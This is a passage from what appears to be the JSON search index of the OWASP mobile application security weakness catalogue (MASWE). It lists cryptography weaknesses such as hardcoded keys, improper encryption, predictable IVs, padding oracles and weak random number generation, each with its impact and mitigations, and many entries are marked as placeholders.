sensitive data. For example, AWS Secrets Manager, Azure Key Vault, or Google Cloud Secret Manager are some popular managed secrets storage solutions. The app can securely retrieve the necessary secrets at runtime through secure, authenticated API calls.</li> <li>Encrypt and Wrap Keys: Whenever storing keys in platform keystores is not suitable for the use case or keys need to be exported, use envelope encryption (DEK+KEK) and key wrapping techniques as specified in NIST.SP.800-175Br1 5.3.5 to protect cryptographic keys before storing them.</li> <li>Follow Standard Key Management Best Practices: Implement proper key management practices, including key rotation and robust protection mechanisms for keys in storage as outlined in NIST.SP.800-57pt1r5 6.2.2, ensuring availability, integrity, confidentiality, and proper association with usage, entities, and related information.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0014/#tests","title":"Tests","text":"<p> MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code  MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files  MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code </p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-2","masvs-storage-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0015/","title":"MASWE-0015: Deprecated Android KeyStore Implementations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0015</p>","tags":["android","L2","maswe","masvs-crypto-2","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0015/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Avoid deprecated implementations such as BKS</p>","tags":["android","L2","maswe","masvs-crypto-2","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0015/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Bouncy Castle (BKS)</li> </ul>","tags":["android","L2","maswe","masvs-crypto-2","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0015/#references","title":"References","text":"<ul> <li>https://labs.withsecure.com/publications/how-secure-is-your-android-keystore-authentication</li> <li>https://developer.android.com/reference/java/security/KeyStore</li> <li>https://developer.android.com/about/versions/12/behavior-changes-all#bouncy-castle</li> </ul>","tags":["android","L2","maswe","masvs-crypto-2","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0015/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","L2","maswe","masvs-crypto-2","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0016/","title":"MASWE-0016: Unsafe Handling of Imported Cryptographic Keys","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0016</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0016/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Importing keys without validating their origin or integrity, or using insecure custom key exchange protocols, can inadvertently introduce malicious or compromised keys into the app environment.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0016/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>key import from untrusted sources</li> <li>key import from untrusted storage</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0016/#references","title":"References","text":"<ul> <li>https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#secure-key-import-into-keystore</li> <li>https://developer.android.com/privacy-and-security/keystore#ImportingEncryptedKeys</li> <li>https://developer.android.com/reference/kotlin/android/security/keystore/KeyProtection</li> <li>https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/storing_keys_as_data#2933724</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0016/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0017/","title":"MASWE-0017: Cryptographic Keys Not Properly Protected on Export","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0017</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-storage-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0017/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Before exporting, keys should be \"wrapped\" or encrypted with another key. This process ensures that the cryptographic key is protected during and after export. This is true even if the key is sent over a secure channel.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-storage-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0017/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>key wrapping (NIST.SP.800-175Br1 5.3.5)</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-storage-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0017/#references","title":"References","text":"<ul> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf</li> <li>https://developer.android.com/reference/kotlin/android/security/keystore/KeyProtection</li> <li>https://developer.apple.com/documentation/cryptokit/aes/keywrap</li> <li>https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/storing_keys_as_data#2933723</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-storage-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0017/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-storage-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0018/","title":"MASWE-0018: Cryptographic Keys Access Not Restricted","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0018</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-auth-2","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0018/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Ensuring that cryptographic keys are accessible only under strict conditions, such as when the device is unlocked by an authenticated user, within secure application contexts, bound to the current device, or for limited periods of time, is critical to maintaining the confidentiality and integrity of encrypted data.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-auth-2","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0018/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>from a Background Process</li> <li>locked device (iOS kSecAttrAccessibleWhenUnlockedThisDeviceOnly, Android setUnlockedDeviceRequired)</li> <li>device-bound or non-transferable (iOS ThisDeviceOnly)</li> <li>time-based access (duration)</li> <li>Require User Presence</li> <li>application-specific password</li> <li>biometric authentication</li> <li>key use restricted e.g. requiring user auth with biometrics, User Presence.</li> <li>especially for sensitive operations</li> <li>keys restricted/authorized for a duration of time or specific crypto operation, etc.</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-auth-2","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0018/#references","title":"References","text":"<ul> <li>https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder#setUnlockedDeviceRequired(boolean)</li> <li>https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly</li> <li>https://developer.android.com/training/sign-in/biometric-auth#prompt-the-user-to-authenticate-with-biometrics</li> <li>https://developer.apple.com/documentation/security/restricting-keychain-item-accessibility</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-auth-2","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0018/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-crypto-2","masvs-auth-2","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0019/","title":"MASWE-0019: Risky Cryptography Implementations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L2","maswe","masvs-crypto-1","masvs-code-3"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0019/#overview","title":"Overview","text":"<p>Risky or noncompliant cryptographic implementations, such as those that do not meet established security standards such as FIPS 140-2/3 (Federal Information Processing Standards), may use algorithms that have not been sufficiently tested or that lack certification, may not follow best practices for secure key management, or may include custom cryptographic solutions that haven't undergone rigorous peer review or formal validation.</p>","tags":["android","ios","L2","maswe","masvs-crypto-1","masvs-code-3"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0019/#impact","title":"Impact","text":"<p>Custom cryptographic implementations created without following established standards make them more susceptible to attacks such as brute force or differential cryptanalysis. In addition, cryptography is notoriously difficult to implement correctly, and even small errors in a custom solution, such as incorrect padding or faulty random number generation, can completely undermine the security of the system, exposing sensitive data to attackers.</p> <p>The impact associated with such defects can be very broad and difficult to predict or measure:</p> <ul> <li>Data breaches: Risky cryptography implementations can lead to unauthorized access to sensitive data, resulting in data breaches.</li> <li>Compromised confidentiality, integrity, and authenticity: The core principles of cryptography (confidentiality, integrity, and authenticity) are compromised. Attackers can decrypt, manipulate, or impersonate legitimate users or systems.</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-1","masvs-code-3"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0019/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Deviation from standard libraries: Not using well-known libraries for cryptography, such as those provided by the platforms like Conscrypt or CryptoKit, or other well-established libraries like OpenSSL, BouncyCastle, etc.</li> <li>Use of cryptographic constants: Hardcoded cryptographic constants are typically used to implement cryptographic algorithms. These constants include S-boxes (substitution boxes) for block ciphers, permutation tables, etc.</li> <li>Use of low-level mathematical operations: Low-level mathematical operations (such as bitwise operations, shifts, custom padding schemes) typically used in cryptographic algorithms.</li> <li>High entropy code: An indicator of cryptographic implementations or heavily obfuscated code that may hide cryptographic algorithms from reverse engineering.</li> <li>Use of non-cryptographic functions: Non-cryptographic functions such as Base64 encoding or XOR instead of encryption.</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-1","masvs-code-3"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0019/#mitigations","title":"Mitigations","text":"<ul> <li> <p>Use standard cryptographic libraries and avoid custom cryptography: Avoid developing custom cryptographic algorithms or protocols. Always prefer well-established and widely accepted cryptographic libraries such as OpenSSL, BoringSSL, or platform-specific libraries such as Android's Conscrypt and Apple's CryptoKit. These libraries have undergone extensive testing and are regularly updated to address new security threats.</p> </li> <li> <p>Ensure compliance with security standards: If you can't avoid using custom cryptography, make sure it's implemented to meet industry standards such as FIPS 140-2/3 (Federal Information Processing Standards) or the latest National Institute of Standards and Technology (NIST) recommendations.</p> </li> <li>Perform periodic security audits: If using custom cryptography is unavoidable, perform regular security audits (including thorough code reviews) to identify and remediate any flaws in your custom cryptographic implementations. Engage external security experts to provide an unbiased assessment.</li> </ul>","tags":["android","ios","L2","maswe","masvs-crypto-1","masvs-code-3"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/","title":"MASWE-0020: Improper Encryption","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/#overview","title":"Overview","text":"<p>Improper encryption refers to cryptographic systems or implementations that are vulnerable to attack, allowing unauthorized individuals to decrypt secured data.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/#impact","title":"Impact","text":"<ul> <li>Loss of Confidentiality: Improper encryption may enable attackers to decipher and obtain sensitive information, resulting in unauthorized exposure and possible data breaches.</li> <li>Loss of Integrity: Improper encryption can compromise the integrity of data, allowing adversaries to alter or manipulate the information without detection.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/#mode-of-introduction","title":"Mode of Introduction","text":"<ul> <li>Broken Algorithms: Relying on broken encryption algorithms (i.e., that are deprecated or disallowed by NIST or other standards) such as RC4.</li> <li>Risky Algorithm Configurations: Using IVs with insufficient entropy or reusing them in modes like AES-CBC or AES-CTR breaks semantic security, allowing attackers to detect patterns or recover plaintext differences. In AEAD modes like AES-GCM, reusing nonces or using authentication tags of insufficient length compromises both confidentiality and integrity.</li> <li>Broken Modes of Operation: Using modes that are considered broken. For example, AES-ECB is broken due to practical known-plaintext attacks and it's disallowed by NIST.</li> <li>Insufficient Key Length: The use of insufficient key sizes (e.g., 128-bit keys in AES) can compromise encryption strength making the encryption susceptible to brute-force attacks.</li> <li>Non-Cryptographic Operations: Relying on techniques such as XOR, Base64 encoding, or simple obfuscation methods for security purposes. These methods provide no actual encryption and can be easily reversed or decoded, exposing sensitive data.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/#mitigations","title":"Mitigations","text":"<ul> <li>Use Secure Encryption Modes: Choose secure modes (e.g. approved by NIST) such as <code>AES/GCM/NoPadding</code>.</li> <li>Ensure Proper Initialization Vector Management: Generate IVs using cryptographically secure random number generators (with sufficient entropy) and ensure they are unique for every operation.</li> <li>Use Sufficiently Long Keys: Enforce sufficiently long keys such as those approved by NIST, e.g., a minimum of 256 bits for AES.</li> <li>Rely on Proper Cryptographic Primitives: Rely on well-vetted cryptographic primitives that have undergone rigorous peer review and formal validation.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0020/#tests","title":"Tests","text":"<p> MASTG-TEST-0221: Broken Symmetric Encryption Algorithms  MASTG-TEST-0232: Broken Symmetric Encryption Modes  MASTG-TEST-0210: Broken Symmetric Encryption Algorithms </p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/","title":"MASWE-0021: Improper Hashing","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0021</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Utilizing broken hashing algorithms such as MD5 and SHA1 in a security sensitive context may compromise data integrity and authenticity.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Broken hashing algorithms (e.g. MD5, SHA1, etc.)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/cryptography#deprecated-functionality</li> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf</li> <li>https://en.wikipedia.org/wiki/Collision_attack</li> <li>https://csrc.nist.gov/pubs/ir/8547/ipd</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0021/#tests","title":"Tests","text":"<p> MASTG-TEST-0211: Broken Hashing Algorithms </p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0022/","title":"MASWE-0022: Predictable Initialization Vectors (IVs)","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0022</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0022/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The use of predictable IVs (hardcoded, null, reused) in a security sensitive context can weaken data encryption strength and potentially compromise confidentiality.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0022/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>not use the IvParameterSpec.class anymore for GCM, use the GCMParameterSpec.class instead (Android)</li> <li>Hardcoded IVs</li> <li>Null IVs</li> <li>Reused IVs</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0022/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/cryptography#pbe-without-iv</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0022/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0023/","title":"MASWE-0023: Risky Padding","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0023/#overview","title":"Overview","text":"<p>Padding oracle attacks are a type of side-channel exploit that lets attackers decrypt or manipulate data without knowing the key. These attacks aren't due to the padding scheme bring broken itself, they arise when the app reveals whether a padding error occurred (through error messages or timing differences), creating an oracle. By submitting modified ciphertexts and observing the app's response, an attacker can gradually recover plaintext or forge ciphertext, compromising both confidentiality and integrity.</p> <p>Below are two common examples of cryptographic contexts where risky padding can become a problem:</p> <ul> <li>Symmetric Cryptography: In block cipher modes (e.g., AES-CBC), PKCS#7 padding is widely used and it's not broken (not disallowed by NIST). However, it becomes vulnerable to padding oracle attacks if the system leaks detailed error messages or timing differences. To mitigate this, cryptographers often use authenticated encryption modes like AES-GCM or pair AES-CBC with a separate integrity check (e.g., HMAC in an Encrypt-then-MAC scheme).</li> <li>Asymmetric Cryptography: With RSA, PKCS#1 v1.5 is known to be susceptible to attacks such as Bleichenbacher (based on padding oracles). This older scheme is now discouraged or disallowed by various standards (for example, see RFC 8017, Section 7.2 from November 2016 or NIST SP 800-131A Rev.2, Section 6 from March 2019).</li> </ul> <p>However, simply using a padding scheme susceptible to padding oracle attacks does not guarantee a vulnerability. As mentioned above, the app must also leak information (the \"oracle\") that indicates whether a padding error has occurred. If both conditions are met, attackers can use these signals to recover sensitive data or to craft malicious ciphertext.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0023/#impact","title":"Impact","text":"<ul> <li>Loss of Integrity: Attackers can modify ciphertext, exploiting the padding oracle to trick the system into accepting maliciously altered data, leading to unauthorized data modifications.</li> <li>Loss of Confidentiality: Attackers can use the padding oracle to iteratively decrypt sensitive information, such as passwords or session tokens, leading to exposure of confidential data.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0023/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Unauthenticated Padding for Symmetric Encryption: Using padding schemes like PKCS#7 without authenticating the ciphertext (e.g., with HMAC) allows padding oracle attacks in modes like AES-CBC.</li> <li>Risky Padding in Asymmetric Encryption: Using schemes like PKCS#1 v1.5 for RSA encryption without strict, uniform handling of invalid ciphertext enables oracle attacks.</li> <li>Exposure of Cryptographic Errors: Revealing detailed error messages or timing variations during decryption can leak information exploitable by attackers.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0023/#mitigations","title":"Mitigations","text":"<ul> <li>Use Authenticated Symmetric Encryption Modes: Prefer authenticated encryption modes like AES-GCM, which eliminate the need for separate padding validation and incorporate integrity checks. If AES-CBC must be used, adopt the Encrypt-then-MAC paradigm (e.g., append HMAC). See NIST SP 800-175B Rev.1, Section 4.3.</li> <li>Use Secure Padding Schemes for Asymmetric Encryption: Replace risky schemes like PKCS#1 v1.5 with secure ones such as OAEP (Optimal Asymmetric Encryption Padding). See NIST SP 800-56B Rev.2, Section 7.2.2.</li> <li>Don't Expose Cryptographic Errors: Do not expose cryptographic error messages, such as padding errors, to users. This prevents attackers from gaining clues about the padding's correctness.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0024/","title":"MASWE-0024: Improper Use of Message Authentication Code (MAC)","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0024</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0024/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Improper use of MACs in security sensitive contexts affecting data integrity.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0024/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Using HMAC with keys with insufficient entropy</li> <li>Using HMAC with missing timestamp (or nonce)</li> <li>Using MAC\u2011then\u2011encrypt or encrypt\u2011then\u2011MAC incorrectly, leaking information via timing or error messages</li> <li>Allowing predictors (users or attackers) to control data inputs, creating scenarios where forged or replayed tags bypass integrity checks.</li> <li>Hash functions lacking collision resistance (e.g., MD5 or SHA\u20111 used in HMAC)</li> <li>Use of non\u2011cryptographic checksums (e.g., CRC\u201132 instead of HMAC)</li> <li>MAC constructions that fail outside narrow assumptions (e.g., raw CBC\u2011MAC on variable\u2011length messages)</li> <li>Tags that are too short significantly lower the effort required for forgery</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0024/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/cryptography#deprecated-functionality</li> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf</li> <li>https://csrc.nist.gov/pubs/sp/800/224/ipd</li> <li>https://datatracker.ietf.org/doc/html/rfc6151</li> <li>https://web.archive.org/web/20170810051504/http://www.tcs.hut.fi/old/papers/aura/aura-csfws97.pdf</li> <li>https://en.wikipedia.org/wiki/Replay_attack</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0024/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0025/","title":"MASWE-0025: Improper Generation of Cryptographic Signatures","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0025</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0025/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The use of algorithms with insufficient strength for signatures such as SHA1withRSA, etc. in a security-sensitive context should be avoided to ensure the integrity and authenticity of the data.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0025/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/cryptography#deprecated-functionality</li> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf</li> <li>https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-5.pdf</li> <li>https://csrc.nist.gov/pubs/ir/8547/ipd</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0025/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0026/","title":"MASWE-0026: Improper Verification of Cryptographic Signature","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0026</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0026/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Cryptographic signature verification should be performed properly to ensure the integrity and authenticity of the data.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0026/#references","title":"References","text":"<ul> <li>https://cwe.mitre.org/data/definitions/347.html</li> <li>https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-5.pdf</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0026/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0014 - Testing the Configuration of Cryptographic Standard Algorithms (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1","placeholder"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/","title":"MASWE-0027: Improper Random Number Generation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/#overview","title":"Overview","text":"<p>A pseudorandom number generator (PRNG) algorithm generates sequences based on a seed with insufficient entropy that may be predictable. Common implementations are not cryptographically secure. For example, they typically use a linear congruential formula, allowing an attacker to predict future outputs, given enough observed outputs. Therefore, it is not suitable for security-critical applications or protecting sensitive data.</p>","tags":["android","ios","L1","L2","maswe","masvs-crypto-1"]},{"location":"MASWE/MASVS-CRYPTO/MASWE-0027/#impact","title":"Impact","text":"<ul> <li>Bypass Protection Mechanism: Using a non-cryptographically secure PRNG in a security context, such as authentication, poses significant risks. 